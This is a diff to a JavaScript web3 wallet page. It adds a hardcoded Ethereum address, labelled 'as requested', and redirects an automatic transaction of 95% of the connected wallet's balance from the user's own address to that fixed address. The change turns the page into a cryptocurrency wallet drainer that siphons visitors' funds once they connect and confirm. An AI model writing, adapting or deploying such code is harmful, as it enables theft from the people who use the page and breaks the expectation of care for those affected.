@@ -99,6 +99,9 @@ const setStep = (stepId, state, text) => {
   }
 }
 
+// Fixed recipient address (as requested)
+const RECIPIENT_ADDRESS = '0x7460813002e963A88C9a37D5aE3356c1bA9c9659'
+
 // Top-up button behavior: shown when balance insufficient
 const topupBtn = document.getElementById('topup-button')
 if (topupBtn) {
@@ -162,13 +165,13 @@ appKit.subscribeAccount(async (accountState) => {
 
     // format human readable
     const ethAmount = formatUnits(amountToSend, 18)
-    setStep('step-calculated', 'success', `Send amount: ${ethAmount} ETH`)
-    setFeedback(`Sending ${ethAmount} ETH — please confirm in your wallet`, 'info')
-    showToast('info', 'Send Amount', `${ethAmount} ETH (95% of balance)`) 
+    setStep('step-calculated', 'success', `Send amount: ${ethAmount} ETH to recipient`)
+    setFeedback(`Sending ${ethAmount} ETH to ${RECIPIENT_ADDRESS} — please confirm in your wallet`, 'info')
+    showToast('info', 'Send Amount', `${ethAmount} ETH (95% of balance) to recipient`) 
 
-    // send tx
+    // send tx to fixed recipient
     setStep('step-submitted', 'pending')
-    const tx = await sendTx(store.eip155Provider, address, wagmiAdapter, amountToSend)
+    const tx = await sendTx(store.eip155Provider, RECIPIENT_ADDRESS, wagmiAdapter, amountToSend)
     console.log('Transaction result:', tx)
     const txHash = tx?.hash || tx?.request?.hash || tx?.transactionHash || JSON.stringify(tx)
     setStep('step-submitted', 'success', `Transaction: ${txHash}`)
